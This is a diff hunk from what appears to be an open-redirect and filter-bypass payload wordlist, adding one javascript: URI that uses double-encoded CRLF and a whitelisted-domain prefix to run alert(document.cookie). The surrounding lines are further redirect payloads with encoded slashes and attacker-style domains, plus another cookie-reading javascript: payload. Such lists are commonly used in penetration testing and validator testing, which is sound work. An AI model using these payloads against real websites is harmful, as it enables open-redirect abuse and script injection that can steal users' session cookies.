@@ -266,6 +266,7 @@ http://www.whitelisteddomain.tld%2elocaldomain.pw/
 /https:/%5clocaldomain.pw/
 https:/%5clocaldomain.pw/
 javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascripT://www.whitelisteddomain.tld/%250d%250aalert(document.cookie)
 /http://localdomain.pw
 /%2f%2flocaldomain.pw
 //%2f%2flocaldomain.pw
